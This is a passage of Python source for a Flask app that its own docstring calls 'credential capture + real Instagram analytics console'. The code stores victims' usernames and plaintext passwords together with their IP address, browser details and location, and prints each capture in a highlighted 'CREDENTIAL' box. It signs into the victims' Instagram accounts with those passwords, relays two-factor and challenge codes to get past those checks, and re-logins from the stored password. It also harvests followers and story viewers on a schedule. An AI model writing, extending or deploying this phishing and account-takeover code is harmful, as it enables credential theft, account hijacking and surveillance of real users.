"""
Insight Capture — credential capture + real Instagram analytics console.

Env:
  SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
  ADMIN_TOKEN        console password             (unset = open, dev only)
  DATA_DIR           sqlite + log directory       (default ./data)
  GEO                1 to enable IP geo lookup    (default off)
  GEO_TIMEOUT        geo lookup timeout, seconds  (default 1.2)
  GEO_TTL            geo cache TTL, seconds       (default 3600)
  ANSI               0 to strip log colours       (default: on when stdout is a tty)
  PORT               listen port                  (default 5000)
  TRUST_PROXY        trusted proxy hops           (default 1, 0 = direct)
  CLIENT_IP_HEADER   e.g. CF-Connecting-IP        (default: ProxyFix / remote_addr)
  COOKIE_SECURE      1/0                          (default: on when RENDER is set)

Instagram:
  IG_PROXY           http(s) proxy for IG calls   (strongly recommended on servers)
  IG_SYNC_MINUTES    background sync interval     (default 10)
  GHOST_DAYS         no-engagement window         (default 120)
  MAX_MEDIA_SCAN     posts scanned per sync       (default 48)
  ACTIONS_PER_HOUR   write-action cap per client  (default 60)
"""

from __future__ import annotations

import base64
import csv
import hashlib
import hmac
import io
import ipaddress
import json
import logging
import os
import random
import secrets
import sqlite3
import sys
import threading
import time
import unicodedata
import urllib.request
import uuid
from collections import OrderedDict, deque
from datetime import datetime, timezone
from logging.handlers import RotatingFileHandler
from pathlib import Path
from urllib.parse import urlencode

from flask import (
    Flask,
    Response,
    abort,
    g,
    jsonify,
    redirect,
    request,
    session,
    url_for,
)
from markupsafe import escape
from werkzeug.middleware.proxy_fix import ProxyFix

try:
    from instagrapi import Client
    try:
        from instagrapi.exceptions import (
            BadPassword,
            ChallengeRequired,
            LoginRequired,
            PleaseWaitFewMinutes,
            RateLimitError,
            TwoFactorRequired,
        )
    except ImportError:
        from instagrapi.exceptions import ChallengeRequired, TwoFactorRequired

        class _Other(Exception):
            pass

        BadPassword = LoginRequired = PleaseWaitFewMinutes = RateLimitError = _Other
    IG_OK = True
except Exception:
    Client = None
    IG_OK = False

    class _NoIG(Exception):
        pass

    BadPassword = ChallengeRequired = LoginRequired = _NoIG
    PleaseWaitFewMinutes = RateLimitError = TwoFactorRequired = _NoIG

try:
    from cryptography.fernet import Fernet

    CRYPTO_OK = True
except Exception:
    CRYPTO_OK = False


# ============================== config ==============================
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
GEO_ENABLED = os.environ.get("GEO", "0") == "1"
GEO_TIMEOUT = float(os.environ.get("GEO_TIMEOUT", "1.2"))
GEO_TTL = int(os.environ.get("GEO_TTL", "3600"))
GEO_FAIL_TTL = int(os.environ.get("GEO_FAIL_TTL", "120"))
TRUST_PROXY = int(os.environ.get("TRUST_PROXY", "1") or 0)
CLIENT_IP_HEADER = os.environ.get("CLIENT_IP_HEADER", "").strip()
COOKIE_MAX_AGE = 60 * 60 * 24 * 365

IG_PROXY = os.environ.get("IG_PROXY", "").strip()
SYNC_MINUTES = int(os.environ.get("IG_SYNC_MINUTES", "10"))
GHOST_DAYS = int(os.environ.get("GHOST_DAYS", "120"))
MAX_MEDIA_SCAN = int(os.environ.get("MAX_MEDIA_SCAN", "48"))
ACTIONS_PER_HOUR = int(os.environ.get("ACTIONS_PER_HOUR", "60"))
ACTION_DELAY = (2.5, 6.0)
MAX_FOLLOW_CAP = 6000
NEVER = 9999

_ansi_env = os.environ.get("ANSI")
ANSI_ON = (_ansi_env != "0") if _ansi_env is not None else sys.stdout.isatty()

DATA_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH = DATA_DIR / "insight.sqlite3"
JSONL_PATH = DATA_DIR / "events.jsonl"
SESS_DIR = DATA_DIR / "sessions"


def _load_secret() -> str:
    """Env key wins; otherwise persist a generated one so restarts/workers agree."""
    env = os.environ.get("SECRET_KEY")
    if env:
        return env
    path = DATA_DIR / "secret.key"
    try:
        if path.exists():
            existing = path.read_text(encoding="utf-8").strip()
            if len(existing) >= 32:
                return existing
    except OSError:
        pass
    generated = secrets.token_hex(32)
    try:
        path.write_text(generated + "\n", encoding="utf-8")
        os.chmod(path, 0o600)
    except OSError:
        pass
    return generated


app = Flask(__name__)
app.secret_key = _load_secret()
if TRUST_PROXY > 0:
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=TRUST_PROXY, x_proto=TRUST_PROXY, x_host=TRUST_PROXY)
app.config.update(
    SESSION_COOKIE_NAME="insight_session",
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=(
        os.environ.get("COOKIE_SECURE", "1" if os.environ.get("RENDER") else "0") != "0"
    ),
    PERMANENT_SESSION_LIFETIME=COOKIE_MAX_AGE,
    MAX_CONTENT_LENGTH=512 * 1024,
    JSON_SORT_KEYS=False,
)

# ============================== logging ==============================
logger = logging.getLogger("insight")
logger.setLevel(os.environ.get("LOG_LEVEL", "INFO"))
logger.propagate = False
_fmt = logging.Formatter("%(asctime)s %(levelname)-5s %(message)s")

if not logger.handlers:
    _sh = logging.StreamHandler(sys.stdout)
    _sh.setFormatter(_fmt)
    logger.addHandler(_sh)

    _fh = RotatingFileHandler(DATA_DIR / "insight.log", maxBytes=1_000_000, backupCount=3)
    _fh.setFormatter(_fmt)
    logger.addHandler(_fh)

_jsonl_lock = threading.Lock()

# --- ANSI palette ---
C = {
    "reset": "\033[0m",
    "cred": "\033[1;33m",
    "cred_val": "\033[1;97m",
    "uval": "\033[1;96m",
    "pval": "\033[1;95m",
    "ctx": "\033[2;36m",
    "meta": "\033[1;35m",
}
BOX_W = 64
_ZERO_W = "\u200d\ufe0f"


def paint(text: str, color: str) -> str:
    return f"{C.get(color, '')}{text}{C['reset']}" if ANSI_ON else text


def _char_w(ch: str) -> int:
    if ch in _ZERO_W or unicodedata.combining(ch):
        return 0
    return 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1


def fit(text: str, width: int) -> str:
    """Truncate + pad by display width (emoji/CJK aware)."""
    out: list[str] = []
    used = 0
    for ch in str(text):
        cw = _char_w(ch)
        if used + cw > width:
            break
        out.append(ch)
        used += cw
    return "".join(out) + " " * (width - used)


def print_box(title: str, lines: list, color: str = "cred", value_color: str = "cred_val") -> None:
    """Bordered block on stdout. A line may be (text, colour) to override its colour."""
    inner = BOX_W - 2
    rows = [paint("╔" + "═" * BOX_W + "╗", color),
            paint("║ ", color) + paint(fit(title, inner), color) + paint(" ║", color),
            paint("╠" + "═" * BOX_W + "╣", color)]

    for line in lines:
        text, vc = line if isinstance(line, tuple) else (line, value_color)
        rows.append(paint("║ ", color) + paint(fit(text, inner), vc) + paint(" ║", color))

    rows.append(paint("╚" + "═" * BOX_W + "╝", color))
    sys.stdout.write("\n" + "\n".join(rows) + "\n")
    sys.stdout.flush()


def emit(payload: dict, boxes: list[tuple] | None = None) -> None:
    """Credential box on stdout + one machine line in events.jsonl."""
    for box in boxes or []:
        print_box(box[0], box[1], box[2] if len(box) > 2 else "cred",
                  box[3] if len(box) > 3 else "cred_val")

    stamp = iso_now()
    body = {"ts": stamp, "kind": "CREDENTIAL", **payload}

    lines = [f"── CREDENTIAL ── {stamp}"]
    for k, v in payload.items():
        if isinstance(v, dict):
            for sk, sv in v.items():
                lines.append(f"   {sk}: {str(sv)[:200]}")
        else:
            lines.append(f"   {k}: {str(v)[:400]}")
    logger.info("\n".join(lines))

    try:
        with _jsonl_lock, JSONL_PATH.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(body, ensure_ascii=False) + "\n")
    except OSError:
        pass


# ============================== time ==============================
def iso_now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def iso_ago(seconds: int) -> str:
    return datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")


def days_since(stamp: str | None) -> int:
    if not stamp:
        return NEVER
    try:
        then = datetime.fromisoformat(stamp)
    except ValueError:
        return NEVER
    if then.tzinfo is None:
        then = then.replace(tzinfo=timezone.utc)
    return max(0, int((datetime.now(timezone.utc) - then).total_seconds() // 86400))


# ============================== storage ==============================
_db_lock = threading.Lock()

SCHEMA = """
CREATE TABLE IF NOT EXISTS creds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cid TEXT, sid TEXT, source TEXT, username TEXT, password TEXT,
    ip TEXT, ua TEXT, referer TEXT, accept_lang TEXT,
    meta_json TEXT, country TEXT, city TEXT, isp TEXT, geo_json TEXT,
    created_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_creds_id ON creds(id DESC);
CREATE INDEX IF NOT EXISTS idx_creds_pair ON creds(cid, username, password);
CREATE INDEX IF NOT EXISTS idx_creds_time ON creds(created_at);

CREATE TABLE IF NOT EXISTS ig_sessions (
    cid TEXT PRIMARY KEY, username TEXT, pass_enc TEXT,
    session_json TEXT, device_json TEXT, created_at TEXT, used_at TEXT
);
CREATE TABLE IF NOT EXISTS self (
    cid TEXT PRIMARY KEY, pk TEXT, username TEXT, full_name TEXT, pic TEXT,
    followers INTEGER, following INTEGER, posts INTEGER, synced_at TEXT
);
CREATE TABLE IF NOT EXISTS profiles (
    pk TEXT PRIMARY KEY, username TEXT, full_name TEXT, pic TEXT,
    verified INTEGER, private INTEGER, updated_at TEXT
);
CREATE TABLE IF NOT EXISTS snapshots (
    id INTEGER PRIMARY KEY AUTOINCREMENT, cid TEXT, kind TEXT, payload TEXT, taken_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_snap ON snapshots(cid, kind, id DESC);
CREATE TABLE IF NOT EXISTS events (
    id INTEGER PRIMARY KEY AUTOINCREMENT, cid TEXT, kind TEXT, subject_pk TEXT,
    subject TEXT, detail TEXT, media TEXT, thumb TEXT, created_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_ev ON events(cid, id DESC);
CREATE TABLE IF NOT EXISTS engagement (
    cid TEXT, pk TEXT, kind TEXT, media TEXT, ts TEXT,
    PRIMARY KEY (cid, pk, kind, media)
);
CREATE TABLE IF NOT EXISTS visits (cid TEXT, pk TEXT, username TEXT, ts TEXT);
CREATE INDEX IF NOT EXISTS idx_visits ON visits(cid, pk);
CREATE TABLE IF NOT EXISTS actions (
    id INTEGER PRIMARY KEY AUTOINCREMENT, cid TEXT, kind TEXT, pk TEXT,
    username TEXT, status TEXT, error TEXT, created_at TEXT
);
CREATE TABLE IF NOT EXISTS followers_cache (cid TEXT, pk TEXT, ts TEXT, PRIMARY KEY (cid, pk));
CREATE TABLE IF NOT EXISTS following_cache (cid TEXT, pk TEXT, ts TEXT, PRIMARY KEY (cid, pk));
"""

INSERT_SQL = """INSERT INTO creds
    (cid, sid, source, username, password, ip, ua, referer,
     accept_lang, meta_json, country, city, isp, geo_json, created_at)
    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""


def connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=15, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=15000")
    return conn


def _with_retry(fn, attempts: int = 5):
    """Retry on transient SQLite lock contention."""
    delay = 0.05
    for attempt in range(attempts):
        try:
            return fn()
        except sqlite3.OperationalError as exc:
            msg = str(exc).lower()
            if ("locked" not in msg and "busy" not in msg) or attempt == attempts - 1:
                raise
            time.sleep(delay)
            delay = min(delay * 2, 0.8)


def init_db() -> None:
    with _db_lock:
        conn = connect()
        try:
            conn.executescript(SCHEMA)
            conn.commit()
        finally:
            conn.close()


def recent_cred_id(cid: str, username: str, password: str, seconds: int = 8) -> int | None:
    conn = connect()
    try:
        row = conn.execute(
            "SELECT id FROM creds WHERE cid=? AND username=? AND password=? AND created_at>=? "
            "ORDER BY id DESC LIMIT 1",
            (cid, username, password, iso_ago(seconds)),
        ).fetchone()
        return int(row["id"]) if row else None
    finally:
        conn.close()


# ============================== helpers ==============================
_rate: dict[str, deque] = {}
_rate_lock = threading.Lock()
_geo_cache: "OrderedDict[str, tuple[float, dict]]" = OrderedDict()
_geo_lock = threading.Lock()
GEO_MAX = 2000


def client_ip() -> str:
    """Real client IP. ProxyFix already normalises XFF; a custom header can override."""
    if CLIENT_IP_HEADER:
        raw = request.headers.get(CLIENT_IP_HEADER, "")
        if raw:
            return raw.split(",")[0].strip() or "-"
    return request.remote_addr or "-"


def is_private(ip: str) -> bool:
    if not ip or ip == "-":
        return True
    try:
        addr = ipaddress.ip_address(ip.split("%")[0])
    except ValueError:
        return True
    return (
        addr.is_private or addr.is_loopback or addr.is_link_local
        or addr.is_reserved or addr.is_multicast or addr.is_unspecified
    )


def rate_ok(key: str, limit: int, window: int = 60) -> bool:
    now = time.time()
    with _rate_lock:
        dq = _rate.get(key)
        if dq is None:
            dq = _rate[key] = deque()
        while dq and now - dq[0] > window:
            dq.popleft()
        if len(dq) >= limit:
            return False
        dq.append(now)
        if len(_rate) > 20_000:
            for dead in [k for k, v in _rate.items() if not v][:5000]:
                _rate.pop(dead, None)
        return True


def _geo_lookup(ip: str) -> dict:
    url = ("http://ip-api.com/json/" + ip +
           "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting")
    try:
        with urllib.request.urlopen(url, timeout=GEO_TIMEOUT) as resp:
            data = json.loads(resp.read().decode("utf-8", "replace"))
    except Exception:
        return {}
    return data if data.get("status") == "success" else {}


def geo(ip: str) -> dict:
    if not GEO_ENABLED or is_private(ip):
        return {}
    now = time.time()
    with _geo_lock:
        hit = _geo_cache.get(ip)
        if hit and hit[0] > now:
            _geo_cache.move_to_end(ip)
            return hit[1]

    data = _geo_lookup(ip)

    with _geo_lock:
        _geo_cache[ip] = (now + (GEO_TTL if data else GEO_FAIL_TTL), data)
        _geo_cache.move_to_end(ip)
        while len(_geo_cache) > GEO_MAX:
            _geo_cache.popitem(last=False)
    return data


def make_initials(name: str) -> str:
    parts = [p for p in name.replace("_", ".").replace("-", ".").replace(" ", ".").split(".") if p]
    return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()


def cred_box(title: str, username: str, password: str) -> tuple:
    return (title, [
        ("username : " + (username or "(blank)"), "uval"),
        ("password : " + (password or "(blank)"), "pval"),
    ], "cred", "uval")


def ctx_box(ip: str, source: str, ua: str, place: str) -> tuple:
    return ("context", [
        ("ip       : " + (ip or "-"), "ctx"),
        ("source   : " + (source or "-"), "ctx"),
        ("place    : " + (place or "-"), "ctx"),
        ("ua       : " + (ua or "-")[:52], "ctx"),
    ], "cred", "ctx")


# ============================== auth / csrf ==============================
def admin_ok() -> bool:
    if not ADMIN_TOKEN:
        return True
    if session.get("admin"):
        return True
    tok = (request.args.get("token") or request.form.get("token")
           or request.headers.get("X-Admin-Token", ""))
    if tok and hmac.compare_digest(str(tok), ADMIN_TOKEN):
        session["admin"] = True
        return True
    return False


def csrf_token() -> str:
    tok = session.get("_csrf")
    if not tok:
        tok = secrets.token_urlsafe(24)
        session["_csrf"] = tok
    return tok


def csrf_ok() -> bool:
    sent = request.form.get("_csrf") or request.args.get("_csrf") or ""
    stored = session.get("_csrf") or ""
    return bool(sent and stored and hmac.compare_digest(sent, stored))


def html(body: str, status: int = 200) -> Response:
    return Response(body, status=status, mimetype="text/html; charset=utf-8")


# ============================== instagram: crypto ==============================
def _fernet() -> "Fernet":
    key = base64.urlsafe_b64encode(
        hashlib.scrypt(app.secret_key.encode(), salt=b"insight-v1",
                       n=2 ** 14, r=8, p=1, dklen=32)
    )
    return Fernet(key)


def seal(text: str) -> str:
    if not CRYPTO_OK:
        return "plain:" + text
    try:
        return _fernet().encrypt(text.encode()).decode()
    except Exception:
        return "plain:" + text


def unseal(token: str) -> str:
    if not token:
        return ""
    if token.startswith("plain:"):
        return token[6:]
    try:
        return _fernet().decrypt(token.encode()).decode()
    except Exception:
        return ""


# ============================== instagram: state ==============================
_ig_lock = threading.RLock()
_states: dict[str, dict] = {}
_clients: dict[str, object] = {}
_verified: dict[str, float] = {}
_queue: "deque[tuple]" = deque()
_queue_cv = threading.Condition()
_action_stamps: dict[str, deque] = {}
_sync_stop: dict[str, threading.Event] = {}
_worker_started = False


def ig_state(cid: str) -> dict:
    with _ig_lock:
        return dict(_states.get(cid) or {"state": "idle", "progress": {"step": "idle", "pct": 0}})


def _ig_set(cid: str, **kw) -> None:
    with _ig_lock:
        cur = _states.setdefault(cid, {"state": "idle", "progress": {"step": "idle", "pct": 0}})
        cur.update(kw)
        cur["at"] = iso_now()


def _ig_progress(cid: str, step: str, pct: int) -> None:
    _ig_set(cid, progress={"step": step, "pct": max(0, min(100, pct))})


def session_path(cid: str) -> Path:
    SESS_DIR.mkdir(parents=True, exist_ok=True)
    return SESS_DIR / f"{cid}.json"


def store_session(cid: str, username: str, password: str, cl) -> None:
    try:
        settings = cl.get_settings()
    except Exception:
        settings = {}
    try:
        path = session_path(cid)
        path.write_text(json.dumps(settings, ensure_ascii=False))
        os.chmod(path, 0o600)
    except OSError:
        pass
    conn = connect()
    try:
        conn.execute(
            "INSERT INTO ig_sessions (cid, username, pass_enc, session_json, device_json, created_at, used_at)"
            " VALUES (?,?,?,?,?,?,?) ON CONFLICT(cid) DO UPDATE SET username=excluded.username,"
            " pass_enc=excluded.pass_enc, session_json=excluded.session_json,"
            " device_json=excluded.device_json, used_at=excluded.used_at",
            (cid, username, seal(password), json.dumps(settings),
             json.dumps(getattr(cl, "device_settings", {})), iso_now(), iso_now()),
        )
        conn.commit()
    finally:
        conn.close()


def drop_session(cid: str) -> None:
    with _ig_lock:
        _clients.pop(cid, None)
        _states.pop(cid, None)
        _verified.pop(cid, None)
    ev = _sync_stop.pop(cid, None)
    if ev:
        ev.set()
    try:
        session_path(cid).unlink()
    except OSError:
        pass
    conn = connect()
    try:
        conn.execute("DELETE FROM ig_sessions WHERE cid=?", (cid,))
        conn.commit()
    finally:
        conn.close()


def _new_client(cid: str, device: dict | None = None):
    cl = Client()
    cl.delay_range = [1, 3]
    if IG_PROXY:
        try:
            cl.set_proxy(IG_PROXY)
        except Exception:
            logger.warning("proxy rejected: %s", IG_PROXY)
    if device:
        try:
            cl.device_settings = device
        except Exception:
            pass

    def handler(username: str, choice) -> str:
        _ig_progress(cid, "challenge", 40)
        _ig_set(cid, state="challenge")
        deadline = time.time() + 300
        while time.time() < deadline:
            code = ig_state(cid).get("code")
            if code:
                _ig_set(cid, code=None)
                return code
            time.sleep(1)
        raise ChallengeRequired("no challenge code supplied")

    cl.challenge_code_handler = handler
    return cl


def get_client(cid: str):
    with _ig_lock:
        cl = _clients.get(cid)
        if cl:
            return cl
    path = session_path(cid)
    if not path.exists():
        return None
    try:
        cl = _new_client(cid)
        cl.set_settings(json.loads(path.read_text()))
        with _ig_lock:
            _clients[cid] = cl
        return cl
    except Exception as exc:
        logger.warning("session load failed for %s: %s", cid, exc)
        return None


def ensure_login(cid: str):
    """Return a live client, relogging from the sealed password if needed."""
    if not IG_OK:
        raise LoginRequired("instagrapi not installed")
    cl = get_client(cid)
    if cl is None:
        raise LoginRequired("no session")
    if _verified.get(cid, 0) > time.time() - 120:
        return cl
    try:
        cl.get_timeline_feed()
        _verified[cid] = time.time()
        return cl
    except Exception:
        _verified.pop(cid, None)

    conn = connect()
    try:
        row = conn.execute("SELECT username, pass_enc FROM ig_sessions WHERE cid=?", (cid,)).fetchone()
    finally:
        conn.close()
    if not row:
        raise LoginRequired("no stored credentials")
    password = unseal(row["pass_enc"])
    if not password:
        raise LoginRequired("stored password unreadable")
    cl = _new_client(cid, getattr(cl, "device_settings", None))
    cl.login(row["username"], password)
    store_session(cid, row["username"], password, cl)
    with _ig_lock:
        _clients[cid] = cl
    _verified[cid] = time.time()
    return cl


# ============================== instagram: login ==============================
def start_login(cid: str, username: str, password: str) -> None:
    if not IG_OK:
        _ig_set(cid, state="error",
                error="instagrapi is not installed — run: pip install instagrapi cryptography")
        return
    _ig_set(cid, state="pending", progress={"step": "queued", "pct": 2}, error=None)
    threading.Thread(target=_login_job, args=(cid, username, password), daemon=True).start()


def _login_job(cid: str, username: str, password: str) -> None:
    try:
        # reuse a still-healthy session for the same handle instead of a fresh login
        existing = get_client(cid)
        if existing is not None:
            if getattr(existing, "username", "") == username:
                try:
                    existing.get_timeline_feed()
                    _verified[cid] = time.time()
                    _ig_set(cid, state="ok", username=username, error=None,
                            progress={"step": "ready", "pct": 100})
                    full_sync(cid, cl=existing)
                    start_scheduler(cid)
                    return
                except Exception:
                    with _ig_lock:
                        _clients.pop(cid, None)
            else:
                with _ig_lock:
                    _clients.pop(cid, None)

        _ig_progress(cid, "connecting", 8)
        cl = _new_client(cid)
        try:
            cl.login(username, password)
        except ChallengeRequired:
            _ig_progress(cid, "challenge", 40)
            _ig_set(cid, state="challenge")
            cl.challenge_resolve(cl.last_json)
            try:
                cl.account_info()
            except Exception:
                cl.login(username, password)
        except TwoFactorRequired:
            store_session(cid, username, password, cl)
            with _ig_lock:
                _clients[cid] = cl
            _ig_set(cid, state="2fa", progress={"step": "2fa", "pct": 40},
                    error="two-factor code required")
            return

        store_session(cid, username, password, cl)
        with _ig_lock:
            _clients[cid] = cl
        _verified[cid] = time.time()

        me = cl.account_info()
        _ig_set(cid, state="ok", username=username, pk=str(me.pk), error=None,
                progress={"step": "syncing", "pct": 55})
        logger.info("login ok cid=%s user=%s", cid, username)
        full_sync(cid, cl=cl, first=True)
        start_scheduler(cid)
        _ig_set(cid, state="ok", progress={"step": "ready", "pct": 100})
    except BadPassword:
        _ig_set(cid, state="error", error="wrong username or password")
    except (PleaseWaitFewMinutes, RateLimitError):
        _ig_set(cid, state="error",
                error="instagram is rate limiting this IP — retry in a few minutes or set IG_PROXY")
    except ChallengeRequired:
        _ig_set(cid, state="challenge", error="challenge required — enter the code instagram sent")
    except TwoFactorRequired:
        _ig_set(cid, state="2fa", error="two-factor code required")
    except Exception as exc:
        logger.exception("login failed cid=%s", cid)
        _ig_set(cid, state="error", error=f"login failed: {type(exc).__name__}: {exc}"[:240])


def submit_code(cid: str, code: str) -> None:
    _ig_set(cid, code=(code or "").strip())


def submit_2fa(cid: str, code: str) -> None:
    code = (code or "").strip()
    if not code:
        return

    def job():
        try:
            cl = get_client(cid)
            if cl is None:
                raise LoginRequired("login context lost — log in again")
            cl.two_factor_login(code)
            conn = connect()
            try:
                row = conn.execute(
                    "SELECT username, pass_enc FROM ig_sessions WHERE cid=?", (cid,)).fetchone()
            finally:
                conn.close()
            if row:
                store_session(cid, row["username"], unseal(row["pass_enc"]), cl)
            with _ig_lock:
                _clients[cid] = cl
            _verified[cid] = time.time()
            me = cl.account_info()
            _ig_set(cid, state="ok", pk=str(me.pk), error=None)
            full_sync(cid, cl=cl, first=True)
            start_scheduler(cid)
        except Exception as exc:
            _ig_set(cid, state="error", error=f"2fa failed: {exc}"[:200])

    _ig_set(cid, state="pending", progress={"step": "2fa", "pct": 45})
    threading.Thread(target=job, daemon=True).start()


# ============================== instagram: sync ==============================
def remember_user(conn: sqlite3.Connection, u) -> None:
    try:
        conn.execute(
            "INSERT INTO profiles (pk, username, full_name, pic, verified, private, updated_at)"
            " VALUES (?,?,?,?,?,?,?) ON CONFLICT(pk) DO UPDATE SET username=excluded.username,"
            " full_name=excluded.full_name, pic=excluded.pic, verified=excluded.verified,"
            " private=excluded.private, updated_at=excluded.updated_at",
            (str(u.pk), u.username, (u.full_name or "")[:120],
             str(getattr(u, "profile_pic_url", "") or "")[:400],
             1 if getattr(u, "is_verified", False) else 0,
             1 if getattr(u, "is_private", False) else 0, iso_now()),
        )
    except Exception:
        pass


def _snapshot(conn, cid: str, kind: str, rows: list[dict]) -> list[dict]:
    prev = conn.execute(
        "SELECT payload FROM snapshots WHERE cid=? AND kind=? ORDER BY id DESC LIMIT 1", (cid, kind)
    ).fetchone()
    conn.execute("INSERT INTO snapshots (cid, kind, payload, taken_at) VALUES (?,?,?,?)",
                 (cid, kind, json.dumps(rows, ensure_ascii=False), iso_now()))
    return json.loads(prev["payload"]) if prev else []


def _event(conn, cid: str, kind: str, subject_pk: str, subject: str, detail: str,
           media: str = "", thumb: str = "") -> None:
    conn.execute(
        "INSERT INTO events (cid, kind, subject_pk, subject, detail, media, thumb, created_at)"
        " VALUES (?,?,?,?,?,?,?,?)",
        (cid, kind, subject_pk, subject, detail[:300], media, thumb[:400], iso_now()),
    )


def _diff_follow(conn, cid: str, kind: str, prev: list[dict], cur: list[dict]) -> None:
    if not prev:
        return
    before = {r["pk"] for r in prev}
    after = {r["pk"] for r in cur}
    by_pk = {r["pk"]: r for r in cur}
    by_pk.update({r["pk"]: r for r in prev})
    for pk in before - after:
        r = by_pk.get(pk, {})
        _event(conn, cid, "unfollowed_you" if kind == "followers" else "you_unfollowed",
               pk, r.get("username", ""), "")
    for pk in after - before:
        r = by_pk.get(pk, {})
        _event(conn, cid, "new_follower" if kind == "followers" else "you_followed",
               pk, r.get("username", ""), "")


def _scan_media(conn, cl, cid: str, medias: list) -> None:
    for m in medias:
        mid = str(m.pk)
        thumb = str(getattr(m, "thumbnail_url", "") or "")
        try:
            likers = cl.media_likers(mid)
            rows = [{"pk": str(u.pk), "username": u.username} for u in likers]
            prev = _snapshot(conn, cid, f"likers:{mid}", rows)
            if prev:
                now = {r["pk"] for r in rows}
                for r in prev:
                    if r["pk"] not in now:
                        _event(conn, cid, "like_removed", r["pk"], r["username"], "", mid, thumb)
            for r in rows:
                conn.execute("INSERT OR IGNORE INTO engagement (cid, pk, kind, media, ts)"
                             " VALUES (?,?,?,?,?)", (cid, r["pk"], "like", mid, iso_now()))
        except Exception:
            pass
        try:
            comments = cl.media_comments(mid, amount=60)
            rows = [{"pk": str(c.pk), "username": c.user.username, "text": c.text} for c in comments]
            prev = _snapshot(conn, cid, f"comments:{mid}", rows)
            if prev:
                now = {r["pk"] for r in rows}
                for r in prev:
                    if r["pk"] not in now:
                        _event(conn, cid, "comment_removed", r["pk"], r["username"],
                               r.get("text", "")[:120], mid, thumb)
            for r in rows:
                conn.execute("INSERT OR IGNORE INTO engagement (cid, pk, kind, media, ts)"
                             " VALUES (?,?,?,?,?)", (cid, r["pk"], "comment", mid, iso_now()))
        except Exception:
            pass


def _scan_stories(conn, cl, cid: str, me_pk: str) -> None:
    try:
        for story in cl.user_stories(me_pk, amount=8):
            for v in cl.story_viewers(str(story.pk)):
                conn.execute("INSERT INTO visits (cid, pk, username, ts) VALUES (?,?,?,?)",
                             (cid, str(v.pk), v.username, iso_now()))
    except Exception:
        pass


def full_sync(cid: str, cl=None, first: bool = False) -> None:
    cl = cl or ensure_login(cid)
    conn = connect()
    try:
        me = cl.account_info()
        conn.execute(
            "INSERT INTO self (cid, pk, username, full_name, pic, followers, following, posts, synced_at)"
            " VALUES (?,?,?,?,?,?,?,?,?) ON CONFLICT(cid) DO UPDATE SET username=excluded.username,"
            " full_name=excluded.full_name, pic=excluded.pic, followers=excluded.followers,"
            " following=excluded.following, posts=excluded.posts, synced_at=excluded.synced_at",
            (cid, str(me.pk), me.username, (me.full_name or "")[:120],
             str(me.profile_pic_url or "")[:400], me.follower_count, me.following_count,
             me.media_count, iso_now()),
        )
        _verified[cid] = time.time()

        _ig_progress(cid, "followers", 60)
        f_cap = min(me.follower_count or 500, MAX_FOLLOW_CAP)
        try:
            followers = cl.user_followers(me.pk, amount=f_cap)
        except Exception as exc:
            followers = {}
            logger.warning("followers fetch failed %s: %s", cid, exc)
        # private account we don't follow returns {} — don't wipe a good cache for that
        if followers or not (me.follower_count or 0):
            frows = []
            conn.execute("DELETE FROM followers_cache WHERE cid=?", (cid,))
            for u in followers.values():
                remember_user(conn, u)
                frows.append({"pk": str(u.pk), "username": u.username})
                conn.execute("INSERT OR REPLACE INTO followers_cache (cid, pk, ts) VALUES (?,?,?)",
                             (cid, str(u.pk), iso_now()))
            prev_f = _snapshot(conn, cid, "followers", frows)
            _diff_follow(conn, cid, "followers", prev_f, frows)

        _ig_progress(cid, "following", 72)
        g_cap = min(me.following_count or 500, MAX_FOLLOW_CAP)
        try:
            following = cl.user_following(me.pk, amount=g_cap)
        except Exception as exc:
            following = {}
            logger.warning("following fetch failed %s: %s", cid, exc)
        if following or not (me.following_count or 0):
            grow = []
            conn.execute("DELETE FROM following_cache WHERE cid=?", (cid,))
            for u in following.values():
                remember_user(conn, u)
                grow.append({"pk": str(u.pk), "username": u.username})
                conn.execute("INSERT OR REPLACE INTO following_cache (cid, pk, ts) VALUES (?,?,?)",
                             (cid, str(u.pk), iso_now()))
            prev_g = _snapshot(conn, cid, "following", grow)
            _diff_follow(conn, cid, "following", prev_g, grow)

        _ig_progress(cid, "media", 84)
        try:
            medias = cl.user_medias(me.pk, amount=MAX_MEDIA_SCAN)
        except Exception:
            medias = []
        _scan_media(conn, cl, cid, medias)
        _scan_stories(conn, cl, cid, str(me.pk))

        conn.commit()
        _ig_set(cid, last_sync=iso_now(), progress={"step": "ready", "pct": 100})
    finally:
        conn.close()


def start_scheduler(cid: str) -> None:
    with _ig_lock:
        if cid in _sync_stop:
            return
        ev = threading.Event()
        _sync_stop[cid] = ev

    def loop():
        while not ev.wait(SYNC_MINUTES * 60):
            try:
                _ig_progress(cid, "syncing", 55)
                full_sync(cid)
            except Exception as exc:
                logger.warning("scheduled sync failed %s: %s", cid, exc)
                _ig_set(cid, state="error", error="session lost — reconnect")

    threading.Thread(target=loop, daemon=True).start()


def sync_now(cid: str) -> None:
    def job():
        try:
            _ig_progress(cid, "syncing", 55)
            full_sync(cid)
        except Exception as exc:
            _ig_set(cid, state="error", error=f"sync failed: {exc}"[:200])

    threading.Thread(target=job, daemon=True).start()


# ============================== instagram: actions ==============================
def _quota(cid: str) -> bool:
    dq = _action_stamps.setdefault(cid, deque())
    now = time.time()
    while dq and now - dq[0] > 3600:
        dq.popleft()
